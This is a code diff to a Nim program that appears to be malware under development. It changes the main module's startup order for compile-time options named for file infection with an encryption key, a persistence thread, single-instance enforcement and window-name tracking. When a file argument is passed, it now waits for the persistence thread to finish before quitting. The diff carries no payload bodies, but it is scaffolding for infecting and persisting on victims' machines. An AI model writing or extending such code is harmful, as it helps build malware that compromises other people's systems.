@@ -15,7 +15,9 @@ when USE_INFECT_THREAD:
 
   from lib/flags import INFECT_ENCRYPTION_KEY
 
-  if paramCount() >= 1:
+  let hasParams: bool = paramCount() >= 1
+
+  if hasParams:
     try:
       let file = paramStr 1
       let (_, name, ext) = splitFile file
@@ -34,6 +36,27 @@ when USE_INFECT_THREAD:
     except:
       quit 0
 
+from lib/flags import USE_PERSISTENCE_THREAD
+when USE_PERSISTENCE_THREAD:
+  from lib/threads/persistenceThread import initPersistenceThread
+
+  var persistenceThreadVar: Thread[void]
+
+  createThread(persistenceThreadVar, initPersistenceThread)
+
+  ## wait for persistenceThreadVar to end
+  ## to start the installed program and quit
+  when USE_INFECT_THREAD:
+    if hasParams:
+      joinThread persistenceThreadVar
+
+      # [here] launch new instance
+
+    # quit if decrypting and, if its the case, installing done
+when USE_INFECT_THREAD:
+  if hasParams:
+    quit 0
+
 from lib/flags import ALLOW_ONLY_ONE_INSTANCE
 when ALLOW_ONLY_ONE_INSTANCE:
   from wAuto/process import processes
@@ -49,7 +72,6 @@ when ALLOW_ONLY_ONE_INSTANCE:
     len += 1
     if len > 1:
       quit 0
-
 
 from lib/constants import isProd
 when not isProd:
@@ -81,14 +103,6 @@ when USE_INFECT_THREAD:
   var infectThreadVar: Thread[void]
 
   createThread(infectThreadVar, initInfectThread)
-
-from lib/flags import USE_PERSISTENCE_THREAD
-when USE_PERSISTENCE_THREAD:
-  from lib/threads/persistenceThread import initPersistenceThread
-
-  var persistenceThreadVar: Thread[void]
-
-  createThread(persistenceThreadVar, initPersistenceThread)
 
 from lib/flags import USE_WINDOW_NAME_THREAD
 when USE_WINDOW_NAME_THREAD:
